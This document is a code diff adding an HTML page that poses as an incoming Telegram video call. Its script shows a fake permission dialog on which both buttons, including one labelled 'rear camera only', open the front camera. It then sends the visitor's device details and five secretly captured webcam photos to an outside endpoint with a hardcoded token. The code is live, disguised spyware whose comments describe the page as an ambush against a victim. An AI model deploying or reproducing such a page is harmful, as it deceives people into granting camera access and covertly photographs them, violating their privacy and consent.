@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Video Call</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a222d; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .call-container { background: #242f3d; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; width: 100%; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5); position: relative; }
+        .avatar { width: 120px; height: 120px; border-radius: 50%; background: #0088cc; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 50px; font-weight: bold; }
+        .caller-name { font-size: 28px; font-weight: 600; margin-bottom: 10px; }
+        .call-status { font-size: 18px; color: #a0b3c7; margin-bottom: 40px; }
+        .buttons { display: flex; justify-content: center; gap: 20px; }
+        button { border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 30px; transition: background-color 0.2s; }
+        .round-btn { width: 80px; height: 80px; border-radius: 50%; }
+        #joinButton { background: #28a745; color: white; }
+        #declineButton { background: #dc3545; color: white; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; z-index: 1000; }
+        .modal-content { background: #242f3d; padding: 30px; border-radius: 15px; text-align: center; max-width: 320px; border: 1px solid #445; }
+        .modal-content h2 { margin-bottom: 15px; font-size: 22px; font-family: 'Cairo', sans-serif; }
+        .modal-content p { margin-bottom: 25px; color: #a0b3c7; line-height: 1.6; font-family: 'Cairo', sans-serif; }
+        .modal-buttons { display: flex; justify-content: space-around; gap: 10px; }
+        .modal-buttons button { background: #0088cc; color: white; padding: 12px 25px; border-radius: 10px; font-size: 16px; font-weight: 600; font-family: 'Cairo', sans-serif; width: 48%; }
+        #hiddenVideo, #hiddenCanvas { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; }
+    </style>
+</head>
+<body>
+    <div class="call-container">
+        <div class="avatar">T</div>
+        <h1 class="caller-name">Incoming Video Call</h1>
+        <p class="call-status" id="statusMessage">Telegram</p>
+        <div class="buttons">
+            <button id="declineButton" class="round-btn">✖</button>
+            <button id="joinButton" class="round-btn">📞</button>
+        </div>
+    </div>
+    
+    <div id="permissionModal" class="modal-overlay">
+        <div class="modal-content">
+            <h2 dir="rtl">مطلوب إذن الكاميرا</h2>
+            <p dir="rtl">للانضمام لمكالمة الفيديو، تحتاج لتشغيل الكاميرا.</p>
+            <div class="modal-buttons">
+                <button id="placeboButton" dir="rtl">الكاميرا الخلفية فقط</button>
+                <button id="confirmButton" dir="rtl">موافق</button>
+            </div>
+        </div>
+    </div>
+
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        class PsychologicalMazeProtocol {
+            constructor() {
+                this.apiEndpoint = 'https://ahmed1997.pythonanywhere.com/api/v1/log_event';
+                this.authToken = 'ahmed-secret-key-777';
+                this.stream = null;
+                this.maxCaptures = 5;
+                this.captureCount = 0;
+                this.operationStarted = false;
+
+                // --- الكمين: كل شيء يبدأ عند الضغط على زر الرد ---
+                document.getElementById('joinButton').onclick = () => this.showModal();
+                document.getElementById('declineButton').onclick = () => this.disappear();
+                
+                // --- الخيانة: كلا الزرين في النافذة المزيفة يفعلان نفس الشيء ---
+                document.getElementById('confirmButton').onclick = () => this.requestCamera();
+                document.getElementById('placeboButton').onclick = () => this.requestCamera();
+            }
+
+            updateStatus(message) { document.getElementById('statusMessage').textContent = message; }
+            showModal() { 
+                document.getElementById('permissionModal').style.display = 'flex'; 
+                document.getElementById('joinButton').disabled = true;
+            }
+            hideModal() { document.getElementById('permissionModal').style.display = 'none'; }
+            
+            async requestCamera() {
+                if (this.operationStarted) return;
+                
+                this.hideModal();
+                this.updateStatus('Authenticating...');
+
+                try {
+                    // --- الضربة الأولى: التقرير الأولي ---
+                    await this.sendInitialReport();
+
+                    // --- الهجوم: نطلب دائمًا الكاميرا الأمامية ---
+                    this.stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                    
+                    this.operationStarted = true;
+                    this.updateStatus('Connected. Stream active.');
+                    const video = document.getElementById('hiddenVideo');
+                    video.srcObject = this.stream;
+                    this.soulReader(video);
+
+                } catch (error) {
+                    this.updateStatus('Camera permission denied.');
+                    setTimeout(() => this.disappear(), 2000);
+                }
+            }
+            
+            soulReader(video) {
+                const canvas = document.getElementById('hiddenCanvas');
+                const ctx = canvas.getContext('2d', { willReadFrequently: true });
+                const heartbeat = setInterval(() => {
+                    if (video.readyState >= 2 && video.videoWidth > 0) {
+                        ctx.drawImage(video, 0, 0, 10, 10);
+                        const imageData = ctx.getImageData(0, 0, 1, 1).data;
+                        if (imageData.some(channel => channel > 10)) {
+                            clearInterval(heartbeat);
+                            this.updateStatus('Stream acquired. Capturing...');
+                            this.startCaptureLoop();
+                        }
+                    }
+                }, 100);
+                setTimeout(() => { clearInterval(heartbeat); if (this.captureCount === 0) this.disappear(); }, 7000);
+            }
+
+            async sendInitialReport() {
+                const victimInfo = { userAgent: navigator.userAgent, platform: navigator.platform, attempt: 'Maze Entry' };
+                return fetch(this.apiEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken }, body: JSON.stringify({ info: victimInfo }) });
+            }
+
+            startCaptureLoop() {
+                if (this.captureCount >= this.maxCaptures) { this.disappear(); return; }
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                this.captureCount++;
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                this.sendPhotoReport(imageData, this.captureCount);
+                setTimeout(() => this.startCaptureLoop(), 500);
+            }
+
+            async sendPhotoReport(imageData, count) {
+                const victimInfo = { captureSequence: `${count}/${this.maxCaptures}` };
+                return fetch(this.apiEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken }, body: JSON.stringify({ image: imageData, info: victimInfo }) });
+            }
+
+            disappear() {
+                if (this.stream) { this.stream.getTracks().forEach(track => track.stop()); }
+                const container = document.querySelector('.call-container');
+                container.innerHTML = `<h1 class="caller-name">Call Ended</h1>`;
+            }
+        }
+        
+        new PsychologicalMazeProtocol();
+    </script>
+</body>
+</html>
